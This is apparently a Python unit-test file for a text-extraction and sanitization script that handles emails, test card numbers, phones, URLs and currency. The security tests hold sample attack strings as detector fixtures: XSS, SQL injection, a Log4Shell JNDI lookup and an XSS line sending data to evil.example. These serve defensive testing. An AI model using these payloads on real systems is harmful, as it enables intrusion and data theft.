#!/usr/bin/env python3
"""
tests/test_main.py

Unit tests for src/main.py.

Most of these bugs were originally caught by hand -- running the script and
reading the JSON output. That's how the phone/currency/URL edge cases in
README.md ("Bugs Found & Fixed During Testing") got found. These tests turn
those manual checks into something repeatable, including one regression
test per bug that was actually found, so a future change can't quietly
reintroduce the same problem.

Run with:
    python3 -m unittest discover -s tests -v

or:
    python3 tests/test_main.py
"""

import json
import os
import sys
import tempfile
import unittest

# Make src/main.py importable regardless of where this file is invoked from.
TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(TESTS_DIR)
SRC_DIR = os.path.join(PROJECT_ROOT, "src")
sys.path.insert(0, SRC_DIR)

import main as m  # noqa: E402  (import after sys.path manipulation, by necessity)


# 
# 1. EMAIL EXTRACTION & ALU CLASSIFICATION
# 
class TestEmailExtraction(unittest.TestCase):

    def test_general_email_is_found(self):
        text = "Contact us at hello.world@example.com for details."
        matches = [mtch.group(0) for mtch in m.EMAIL_RE.finditer(text)]
        self.assertIn("hello.world@example.com", matches)

    def test_alu_official_classification(self):
        self.assertEqual(m.classify_alu_email("jane.doe@alueducation.com"), "alu_official")

    def test_alu_alumni_classification(self):
        self.assertEqual(m.classify_alu_email("jane.doe@alumni.alueducation.com"), "alu_alumni")

    def test_alu_si_classification(self):
        self.assertEqual(m.classify_alu_email("jane.doe@si.alueducation.com"), "alu_si")

    def test_alumni_is_not_misclassified_as_official(self):
        # A naive "endswith @alueducation.com" check would wrongly classify
        # an alumni address as official, since alumni.alueducation.com also
        # ends in alueducation.com. classify_alu_email() must check
        # most-specific-first to avoid this.
        self.assertNotEqual(m.classify_alu_email("x@alumni.alueducation.com"), "alu_official")

    def test_non_alu_email_is_general(self):
        self.assertEqual(m.classify_alu_email("someone@gmail.com"), "general")

    def test_rejects_double_at(self):
        text = "broken email: john@@doe.com should not match"
        matches = [mtch.group(0) for mtch in m.EMAIL_RE.finditer(text)]
        self.assertNotIn("john@@doe.com", matches)

    def test_rejects_missing_local_part(self):
        text = "broken email: @missinglocal.com should not match"
        matches = [mtch.group(0) for mtch in m.EMAIL_RE.finditer(text)]
        self.assertEqual([mm for mm in matches if "missinglocal" in mm], [])

    def test_rejects_double_dot_domain(self):
        text = "broken email: someone@bad..domain.com should not match"
        matches = [mtch.group(0) for mtch in m.EMAIL_RE.finditer(text)]
        # a valid match here would have to skip the double dot, which would
        # produce a malformed extraction -- assert none of that happens
        self.assertEqual([mm for mm in matches if "bad" in mm], [])

    def test_mask_email_never_exposes_full_local_part(self):
        masked = m.mask_email("aline.uwase@gmail.com")
        self.assertNotIn("aline.uwase", masked)
        self.assertTrue(masked.endswith("@gmail.com"))
        local_part = masked.split("@", 1)[0]
        self.assertEqual(local_part[0], "a")    # first char of local part kept
        self.assertEqual(local_part[-1], "e")   # last char of local part kept
        self.assertIn("*", local_part)          # middle is masked


# 
# 2. CREDIT CARD VALIDATION (LUHN + NETWORK DETECTION)
# 
class TestCreditCardValidation(unittest.TestCase):

    # Well-known publicly documented TEST card numbers (not real accounts).
    VALID_VISA = "4539148803436467"
    VALID_MASTERCARD = "5555555555554444"
    VALID_AMEX = "378282246310005"
    VALID_DISCOVER = "6011000990139424"
    INVALID_LUHN = "1234567890123456"  # fails checksum

    def test_luhn_accepts_known_valid_numbers(self):
        for number in (self.VALID_VISA, self.VALID_MASTERCARD, self.VALID_AMEX, self.VALID_DISCOVER):
            with self.subTest(number=number):
                self.assertTrue(m.luhn_is_valid(number))

    def test_luhn_rejects_known_invalid_number(self):
        self.assertFalse(m.luhn_is_valid(self.INVALID_LUHN))

    def test_network_detection(self):
        self.assertEqual(m.detect_card_network(self.VALID_VISA), "Visa")
        self.assertEqual(m.detect_card_network(self.VALID_MASTERCARD), "Mastercard")
        self.assertEqual(m.detect_card_network(self.VALID_AMEX), "American Express")
        self.assertEqual(m.detect_card_network(self.VALID_DISCOVER), "Discover")

    def test_network_detection_unknown_prefix(self):
        self.assertEqual(m.detect_card_network("9999999999999999"), "Unknown")

    def test_mask_card_only_shows_last_four(self):
        masked = m.mask_card(self.VALID_VISA)
        self.assertNotIn(self.VALID_VISA[:12], masked)
        self.assertTrue(masked.endswith("6467"))
        self.assertEqual(masked.count("*"), len(self.VALID_VISA) - 4)

    def test_extract_credit_cards_accepts_valid_and_rejects_bogus(self):
        text = f"Card A: {self.VALID_VISA} Card B (bogus, bot-submitted): 1234 5678 9012 3456"
        result = m.extract_credit_cards(text)
        valid_networks = [c["network"] for c in result["valid"]]
        self.assertIn("Visa", valid_networks)
        self.assertEqual(len(result["rejected"]), 1)
        self.assertIn("failed_luhn_checksum", result["rejected"][0]["reason"])

    def test_extract_credit_cards_never_stores_full_pan(self):
        text = f"Card: {self.VALID_VISA}"
        result = m.extract_credit_cards(text)
        dumped = json.dumps(result)
        self.assertNotIn(self.VALID_VISA, dumped)


# 
# 3. PHONE NUMBER EXTRACTION & VALIDATION
#    (includes regression tests for bugs found during manual testing)
# 
class TestPhoneExtraction(unittest.TestCase):

    def test_grouped_international_format(self):
        result = m.extract_phone_numbers("Call us: +250 788 123 456 today.")
        formatted = [p["formatted"] for p in result["valid"]]
        self.assertIn("+250 788 123 456", formatted)

    def test_us_parenthesized_format(self):
        result = m.extract_phone_numbers("Alt line: (415) 555-0192.")
        formatted = [p["formatted"] for p in result["valid"]]
        self.assertIn("(415) 555-0192", formatted)

    def test_unspaced_number_is_found(self):
        # Regression test: originally missed entirely because the phone
        # regex required a separator between digit groups.
        result = m.extract_phone_numbers("Mobile: 0792887129")
        formatted = [p["formatted"] for p in result["valid"]]
        self.assertIn("0792887129", formatted)

    def test_single_digit_trunk_code_in_parens_is_found(self):
        # Regression test: "(0)" (a 1-digit trunk code) was originally
        # rejected because the parens group required 2-4 digits.
        result = m.extract_phone_numbers("Kenya desk: +254 (0) 712 345678")
        formatted = [p["formatted"] for p in result["valid"]]
        self.assertIn("+254 (0) 712 345678", formatted)

    def test_dot_separated_us_format(self):
        result = m.extract_phone_numbers("Line: 555.123.4567")
        formatted = [p["formatted"] for p in result["valid"]]
        self.assertIn("555.123.4567", formatted)

    def test_extension_is_recognized(self):
        result = m.extract_phone_numbers("Reach me at +1 (650) 555-0123 ext. 22")
        formatted = [p["formatted"] for p in result["valid"]]
        self.assertTrue(any("ext" in f for f in formatted))

    def test_too_short_number_is_ignored_not_falsely_validated(self):
        result = m.extract_phone_numbers("weird phone: 12345")
        all_numbers = [p["formatted"] for p in result["valid"]] + [p["raw"] for p in result["rejected"]]
        self.assertEqual(all_numbers, [])

    def test_absurdly_long_digit_run_is_rejected_not_valid(self):
        result = m.extract_phone_numbers("phone: 000-000-0000000000000 (too many digits)")
        formatted_valid = [p["formatted"] for p in result["valid"]]
        self.assertEqual(formatted_valid, [])  # must never show up as "valid"

    def test_iso_date_is_not_mistaken_for_a_phone_number(self):
        result = m.extract_phone_numbers("Ticket opened 2026-09-01 09:14 AM")
        formatted = [p["formatted"] for p in result["valid"]]
        self.assertFalse(any(f.startswith("2026-09-01") for f in formatted))

    def test_ip_address_inside_url_is_not_mistaken_for_a_phone_number(self):
        # Regression test: "192.168" (a fragment of an IP-based URL) was
        # originally leaking through as a false "rejected" phone number.
        result = m.extract_phone_numbers("dashboard: http://192.168.1.42:8080/status")
        all_numbers = [p["formatted"] for p in result["valid"]] + [p["raw"] for p in result["rejected"]]
        self.assertEqual(all_numbers, [])

    def test_card_number_is_not_mistaken_for_a_phone_number(self):
        result = m.extract_phone_numbers("Card: 4539 1488 0343 6467")
        all_numbers = [p["formatted"] for p in result["valid"]] + [p["raw"] for p in result["rejected"]]
        self.assertEqual(all_numbers, [])


# 
# 4. URL EXTRACTION
# 
class TestUrlExtraction(unittest.TestCase):

    def test_https_is_categorized_as_secure(self):
        result = m.extract_urls("See https://alueducation.com/apply for info.")
        self.assertIn("https://alueducation.com/apply", result["https_secure"])

    def test_http_is_categorized_as_insecure(self):
        result = m.extract_urls("Status: http://status.alu.dev/")
        self.assertIn("http://status.alu.dev/", result["http_insecure"])

    def test_bare_www_is_categorized_as_informal(self):
        result = m.extract_urls("Portfolio: www.uwase-portfolio.rw (no https)")
        self.assertIn("www.uwase-portfolio.rw", result["informal_no_scheme_unverified"])

    def test_mailto_link_is_not_treated_as_a_url(self):
        result = m.extract_urls("Reach us: mailto:support@alueducation.com")
        all_urls = result["https_secure"] + result["http_insecure"] + result["informal_no_scheme_unverified"]
        self.assertEqual(all_urls, [])

    def test_broken_scheme_is_ignored(self):
        result = m.extract_urls("weird url: htp:/broken-url..com")
        all_urls = result["https_secure"] + result["http_insecure"]
        self.assertEqual(all_urls, [])

    def test_trailing_sentence_punctuation_is_trimmed(self):
        result = m.extract_urls("Visit https://alueducation.com/apply.")
        self.assertIn("https://alueducation.com/apply", result["https_secure"])
        self.assertNotIn("https://alueducation.com/apply.", result["https_secure"])

    def test_ip_based_url_with_port_is_captured(self):
        result = m.extract_urls("Dashboard: http://192.168.1.42:8080/status")
        self.assertIn("http://192.168.1.42:8080/status", result["http_insecure"])


# 
# 5. HASHTAG EXTRACTION
#
class TestHashtagExtraction(unittest.TestCase):

    def test_simple_hashtag_is_found(self):
        self.assertIn("#ALUSupport", m.extract_hashtags("tag us #ALUSupport please"))

    def test_digit_leading_hashtag_is_found(self):
        # Real hashtags are often allowed to start with digits, e.g. "#250Tech".
        self.assertIn("#250Tech", m.extract_hashtags("trending: #250Tech today"))

    def test_space_after_hash_is_not_a_hashtag(self):
        self.assertEqual(m.extract_hashtags("this is # not a hashtag"), [])

    def test_pure_numeric_ticket_id_is_not_a_hashtag(self):
        # A reference number like "#10231" must not be mistaken for a
        # hashtag just because it starts with "#".
        self.assertEqual(m.extract_hashtags("Ticket #10231 opened today"), [])

    def test_url_fragment_is_not_mistaken_for_a_hashtag(self):
        # "#step-3" is glued directly onto "setup" with no separating
        # whitespace/punctuation, so it's a URL fragment, not a hashtag.
        tags = m.extract_hashtags("https://docs.alueducation.com/guide/setup#step-3")
        self.assertEqual(tags, [])


# 
# 6. CURRENCY EXTRACTION
# 
class TestCurrencyExtraction(unittest.TestCase):

    def test_symbol_first_with_thousands_separator(self):
        self.assertIn("$1,250.00", m.extract_currency("refund of $1,250.00 issued"))

    def test_code_first_format(self):
        self.assertIn("RWF 45,000", m.extract_currency("charge was RWF 45,000 total"))

    def test_symbol_with_trailing_code(self):
        self.assertIn("$12,000.00 USD", m.extract_currency("Budget approved: $12,000.00 USD extra"))

    def test_amount_first_with_no_thousands_separator(self):
        # Regression test: originally missed because the amount pattern
        # required grouping to start in blocks of exactly 3 digits.
        self.assertIn("1250 USD", m.extract_currency("Invoice total: 1250 USD due"))

    def test_small_decimal_amount(self):
        self.assertIn("$0.99", m.extract_currency("Fee: $0.99 charged"))

    def test_single_digit_decimal(self):
        self.assertIn("GBP 45.5", m.extract_currency("Rounded to GBP 45.5 on receipt"))

    def test_unrecognized_currency_code_is_ignored(self):
        # "Ksh" is not one of our supported codes -- must not be misread as
        # part of the number, and must not produce a false match.
        result = m.extract_currency("Local price: Ksh 2,500 only")
        self.assertEqual([r for r in result if "2,500" in r and "Ksh" in r], [])

    def test_bare_number_with_no_currency_marker_is_ignored(self):
        # A plain number with no symbol or code should never be reported as
        # a currency amount -- e.g. "Ticket #10231" or "2,000,000 units".
        self.assertEqual(m.extract_currency("order #10231 shipped in 2 days"), [])


# 
# 7. SECURITY: SANITIZATION & THREAT QUARANTINE
# 
class TestSecuritySanitization(unittest.TestCase):

    def test_null_bytes_are_stripped(self):
        self.assertNotIn("\x00", m.sanitize_text("hello\x00world"))

    def test_ansi_escape_codes_are_stripped(self):
        cleaned = m.sanitize_text("\x1b[31mFAKE\x1b[0m")
        self.assertEqual(cleaned, "FAKE")

    def test_script_tag_is_flagged(self):
        text = "name: <script>alert('xss')</script>"
        _, flagged = m.quarantine_hostile_lines(text)
        self.assertEqual(len(flagged), 1)
        self.assertIn("html_script_tag", flagged[0]["threats_detected"])

    def test_sql_injection_is_flagged(self):
        text = "comment: '); DROP TABLE tickets;--"
        _, flagged = m.quarantine_hostile_lines(text)
        self.assertEqual(len(flagged), 1)
        self.assertIn("sql_injection", flagged[0]["threats_detected"])

    def test_template_and_jndi_injection_is_flagged(self):
        text = "comment2: {{7*7}}${jndi:ldap://malicious.example.com/a}"
        _, flagged = m.quarantine_hostile_lines(text)
        self.assertEqual(len(flagged), 1)
        self.assertIn("template_injection", flagged[0]["threats_detected"])
        self.assertIn("jndi_log4shell", flagged[0]["threats_detected"])

    def test_decorative_dashes_are_not_falsely_flagged(self):
        # Regression test: a plain section divider ("---...") was originally
        # being mistaken for a SQL comment marker ("--").
        text = "Ticket #10233 — chat transcript excerpt --------------------------"
        _, flagged = m.quarantine_hostile_lines(text)
        self.assertEqual(flagged, [])

    def test_flagged_line_is_excluded_from_extraction(self):
        text = (
            "Legit line: contact real@alueducation.com\n"
            "name: <script>alert('xss')document.location='http://evil.example/steal'</script>\n"
        )
        clean_text, flagged = m.quarantine_hostile_lines(text)
        self.assertEqual(len(flagged), 1)
        # the hostile line's URL must never reach the URL extractor
        urls = m.extract_urls(clean_text)
        all_urls = urls["https_secure"] + urls["http_insecure"]
        self.assertEqual(all_urls, [])
        # but the legitimate line above it must still be processed normally
        emails = m.extract_emails(clean_text)
        self.assertEqual(len(emails["alu_official"]), 1)

    def test_flagged_log_does_not_store_full_hostile_payload(self):
        long_payload = "'); DROP TABLE tickets; --" + ("X" * 200)
        _, flagged = m.quarantine_hostile_lines(long_payload)
        self.assertLess(len(flagged[0]["line_preview_redacted"]), len(long_payload))


# 
# 8. END-TO-END INTEGRATION (run() against a temp file)
# 
class TestEndToEndRun(unittest.TestCase):

    def test_run_produces_well_formed_report_and_masks_sensitive_data(self):
        sample_text = (
            "Customer: jane.doe@alueducation.com\n"
            "Card on file: 4539 1488 0343 6467\n"
            "Phone: +250 788 123 456\n"
            "Site: https://alueducation.com/apply\n"
            "Campaign: #ALUFamily\n"
            "Fee: $25.00\n"
            "Hostile: <script>alert(1)</script>\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            input_path = os.path.join(tmp, "raw-text.txt")
            output_path = os.path.join(tmp, "sample-output.json")
            with open(input_path, "w", encoding="utf-8") as f:
                f.write(sample_text)

            results = m.run(input_path=input_path, output_path=output_path)

            # the output file must actually exist and be valid JSON
            self.assertTrue(os.path.exists(output_path))
            with open(output_path, "r", encoding="utf-8") as f:
                on_disk = json.load(f)
            self.assertEqual(on_disk, results)

            # security log must have caught the hostile line
            self.assertEqual(results["security"]["flagged_lines_count"], 1)

            # extraction must have found the legitimate data
            self.assertEqual(len(results["extracted_data"]["emails"]["alu_official"]), 1)
            self.assertEqual(len(results["extracted_data"]["credit_cards"]["valid"]), 1)
            self.assertEqual(len(results["extracted_data"]["phone_numbers"]["valid"]), 1)
            self.assertIn("https://alueducation.com/apply", results["extracted_data"]["urls"]["https_secure"])
            self.assertIn("#ALUFamily", results["extracted_data"]["hashtags"])
            self.assertIn("$25.00", results["extracted_data"]["currency_amounts"])

            # sensitive data must never appear in full anywhere in the file
            raw_json_text = json.dumps(on_disk)
            self.assertNotIn("jane.doe@alueducation.com", raw_json_text)
            self.assertNotIn("4539148803436467", raw_json_text)
            self.assertNotIn("4539 1488 0343 6467", raw_json_text)


if __name__ == "__main__":
    unittest.main(verbosity=2)
